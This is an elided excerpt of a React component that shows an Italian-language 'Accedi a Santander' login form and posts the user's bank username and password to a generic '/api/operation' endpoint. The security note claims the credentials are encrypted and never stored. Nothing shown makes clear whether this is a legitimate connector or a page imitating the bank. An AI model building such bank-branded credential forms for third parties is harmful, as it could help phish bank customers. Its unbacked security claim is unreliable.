...
export default function SantanderConnect() {
    ...
    try {
      ...
      const response = await fetch("/api/operation", {
        ...
        body: JSON.stringify({ 
          username, 
          password, 
          bankName: "Santander" // Ajout explicite du nom de la banque ici
        }),
      });
  ...
  return (
    <div className="bank-connect-container">
      ...
      <h1 className="bank-connect-title">Accedi a Santander</h1>
      ...
      <form className="login-form" onSubmit={handleConnect}>
        ...
        <div className="security-note">
          ...
          <span>I tuoi dati di acesso sono crittografati e non vengono mai salvati sui nostri server.</span>
        </div>
